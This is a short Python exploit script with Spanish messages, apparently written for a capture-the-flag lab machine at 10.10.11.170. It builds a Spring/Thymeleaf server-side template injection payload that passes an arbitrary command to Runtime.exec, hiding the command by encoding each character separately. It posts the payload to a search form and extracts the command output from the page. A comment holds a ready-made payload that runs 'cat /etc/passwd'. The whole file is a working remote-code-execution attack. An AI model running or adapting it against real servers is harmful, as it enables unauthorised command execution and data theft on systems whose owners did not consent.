#!/usr/bin/python3

import requests, sys, pdb, signal, os, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)
if len(sys.argv) < 2:
    print("\n[!] El programa se ha ejecutado incorrectamente")
    sys.exit(1)


def makePayload():
    #*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
    command = sys.argv[1]
    b = len(command)
    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)"% ord(command[0])
    rpta=""
    for i in range(b):
        try:
            #c=""
            #payload = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)"% ord(command[0])
            cadenaNueva = ".concat(T(java.lang.Character).toString(%s))"% ord(command[i+1])
            rpta=rpta+cadenaNueva
            #print(rpta,end="")
        except:
            print("")
        #time.sleep(10)
    rptaFinal=payload+rpta+").getInputStream())}"
    return rptaFinal

def makeRequest(rptaFinal):
    search_url = "http://10.10.11.170:8080/search"
    post_data = {
        'name' : rptaFinal
    }
    r = requests.post(search_url,data=post_data)
    f = open("output.txt","w")
    f.write(r.text)
    f.close()
    os.system("cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/    <h2 class=\"searched\">You searched for: //' | sed 's/<\/h2>//'")
    os.remove("output.txt")

if __name__ == '__main__':
    rptaFinal = makePayload()
    makeRequest(rptaFinal)
